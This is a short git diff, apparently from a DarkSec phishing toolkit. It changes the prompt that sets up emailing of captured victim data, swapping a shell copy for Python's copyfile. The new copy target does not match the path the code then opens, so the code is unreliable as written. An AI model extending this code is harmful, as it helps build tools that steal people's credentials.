@@ -1,4 +1,4 @@
-from Defs.ImportManager.unsorted_will_be_replaced import run_command, wait, path, system, getpass, base64
+from Defs.ImportManager.unsorted_will_be_replaced import run_command, wait, path, system, getpass, base64, copyfile
 import Defs.ThemeManager.theme as theme
 import Defs.ActionManager.simple_informant as simple_informant
 
@@ -58,7 +58,8 @@ def captured_data_email_configuration_prompt():
         {1}http://github.com/darksecdevelopers
         {0}** BY: {1}DARKSEC {0}**'''.format(default_palette[0], default_palette[2]))
     print("-------------------------------\n{0}[ PROMPT: CONFIG EMAIL CREDENTIAL FILE ]{1}!! {0}\n-------------------------------".format(default_palette[0], default_palette[4]))
-    run_command('cp Defs/Send_Email/EmailConfigDefault.py Defs/Send_Email/emailconfig.py')
+    #run_command('cp Defs/Send_Email/EmailConfigDefault.py Defs/Send_Email/emailconfig.py')
+    copyfile('Defs/FeatureManager/EmailManager/EmailConfigDefault.py', 'Defs/FeatureManager/EmailManager/emailconfig.py')
     GMAILACCOUNT = input("{0}[{1}+{0}] Enter Your Gmail Username:{1} ".format(default_palette[0], default_palette[4]))
     with open('Defs/Send_Email/emailconfig.py') as f:
         read_data = f.read()
